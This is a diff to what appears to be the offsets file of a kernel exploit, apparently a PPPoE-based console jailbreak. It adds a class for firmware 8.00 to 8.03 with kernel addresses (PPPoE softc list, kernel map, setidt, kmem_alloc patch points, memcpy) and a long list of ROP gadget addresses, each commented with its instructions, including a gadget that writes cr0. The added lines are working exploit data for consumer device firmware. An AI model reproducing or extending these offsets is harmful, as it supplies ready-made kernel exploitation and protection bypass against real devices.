@@ -3,6 +3,99 @@
 # This software may be modified and distributed under the terms
 # of the MIT license.  See the LICENSE file for details.
 
+# FW 8.00 / 8.01 / 8.03
+class OffsetsFirmware_800_803:
+    PPPOE_SOFTC_LIST = 0xffffffff84422370
+
+    KERNEL_MAP = 0xffffffff83d243e0
+
+    SETIDT = 0xffffffff82249dd0
+
+    KMEM_ALLOC = 0xffffffff8221b3f0
+    KMEM_ALLOC_PATCH1 = 0xffffffff8221b4bc
+    KMEM_ALLOC_PATCH2 = 0xffffffff8221b4c4
+
+    MEMCPY = 0xffffffff8245e1c0
+
+    # 0xffffffff82660609 : mov cr0, rsi ; ud2 ; mov eax, 1 ; ret
+    MOV_CR0_RSI_UD2_MOV_EAX_1_RET = 0xffffffff82660609
+
+    SECOND_GADGET_OFF = 0x3b
+
+    # 0xffffffff82245f1d : jmp qword ptr [rsi + 0x3b]
+    FIRST_GADGET = 0xffffffff82245f1d
+
+    # 0xffffffff82c72e66 : push rbp ; jmp qword ptr [rsi]
+    PUSH_RBP_JMP_QWORD_PTR_RSI = 0xffffffff82c72e66
+
+    # 0xffffffff823b3311 : pop rbx ; pop r14 ; pop rbp ; jmp qword ptr [rsi + 0x10]
+    POP_RBX_POP_R14_POP_RBP_JMP_QWORD_PTR_RSI_10 = 0xffffffff823b3311
+
+    # 0xffffffff8293bb06 : lea rsp, [rsi + 0x20] ; repz ret
+    LEA_RSP_RSI_20_REPZ_RET = 0xffffffff8293bb06
+
+    # 0xffffffff826aeada : add rsp, 0x28 ; pop rbp ; ret
+    ADD_RSP_28_POP_RBP_RET = 0xffffffff826aeada
+
+    # 0xffffffff8267b46f : add rsp, 0xb0 ; pop rbp ; ret
+    ADD_RSP_B0_POP_RBP_RET = 0xffffffff8267b46f
+
+    # 0xffffffff822008e0 : ret
+    RET = 0xffffffff822008e0
+
+    # 0xffffffff82652d81 : pop rdi ; ret
+    POP_RDI_RET = 0xffffffff82652d81
+
+    # 0xffffffff82212728 : pop rsi ; ret
+    POP_RSI_RET = 0xffffffff82212728
+
+    # 0xffffffff82482342 : pop rdx ; ret
+    POP_RDX_RET = 0xffffffff82482342
+
+    # 0xffffffff82233677 : pop rcx ; ret
+    POP_RCX_RET = 0xffffffff82233677
+
+    # 0xffffffff823ac6ed : pop r8 ; pop rbp ; ret
+    POP_R8_POP_RBP_RET = 0xffffffff823ac6ed
+
+    # 0xffffffff8279b42f : pop r12 ; ret
+    POP_R12_RET = 0xffffffff8279b42f
+
+    # 0xffffffff8223711d : pop rax ; ret
+    POP_RAX_RET = 0xffffffff8223711d
+
+    # 0xffffffff822008df : pop rbp ; ret
+    POP_RBP_RET = 0xffffffff822008df
+
+    # 0xffffffff82bb35ba : push rsp ; pop rsi ; ret
+    PUSH_RSP_POP_RSI_RET = 0xffffffff82bb35ba
+
+    # 0xffffffff82529060 : mov rdi, qword ptr [rdi] ; pop rbp ; jmp rax
+    MOV_RDI_QWORD_PTR_RDI_POP_RBP_JMP_RAX = 0xffffffff82529060
+
+    # 0xffffffff82b7124e : mov byte ptr [rcx], al ; ret
+    MOV_BYTE_PTR_RCX_AL_RET = 0xffffffff82b7124e
+
+    # 0xffffffff8232e9ac : mov rdi, rbx ; call r12
+    MOV_RDI_RBX_CALL_R12 = 0xffffffff8232e9ac
+
+    # 0xffffffff8232e7e7 : mov rdi, r14 ; call r12
+    MOV_RDI_R14_CALL_R12 = 0xffffffff8232e7e7
+
+    # 0xffffffff823d049e : mov rsi, rbx ; call rax
+    MOV_RSI_RBX_CALL_RAX = 0xffffffff823d049e
+
+    # 0xffffffff825dc638 : mov r14, rax ; call r8
+    MOV_R14_RAX_CALL_R8 = 0xffffffff825dc638
+
+    # 0xffffffff82cb305a : add rdi, rcx ; ret
+    ADD_RDI_RCX_RET = 0xffffffff82cb305a
+
+    # 0xffffffff8266f467 : sub rsi, rdx ; mov rax, rsi ; pop rbp ; ret
+    SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET = 0xffffffff8266f467
+
+    # 0xffffffff82b82393 : jmp r14
+    JMP_R14 = 0xffffffff82b82393
 
 # FW 9.00
 class OffsetsFirmware_900:
